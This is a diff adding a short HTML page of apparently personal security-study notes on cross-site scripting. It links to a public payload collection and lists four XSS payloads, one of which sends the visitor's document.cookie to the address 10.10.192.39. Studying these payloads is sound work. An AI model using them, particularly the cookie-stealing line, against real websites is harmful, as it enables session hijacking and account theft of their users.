@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>XSS</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>XSS</h1><br/><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads</a><br /><br />&lt;img src=x onerror=alert(&#39;XSS&#39;);&gt;<br />&lt;iframe src=&quot;javascript:alert(`xss`)&quot;&gt; <br />&lt;script&gt;alert(window.location.hostname)&lt;/script&gt;<br />&lt;script&gt;window.location=&#39;http://10.10.192.39/log/&#39;+document.cookie&lt;/script&gt;</div></body></html>
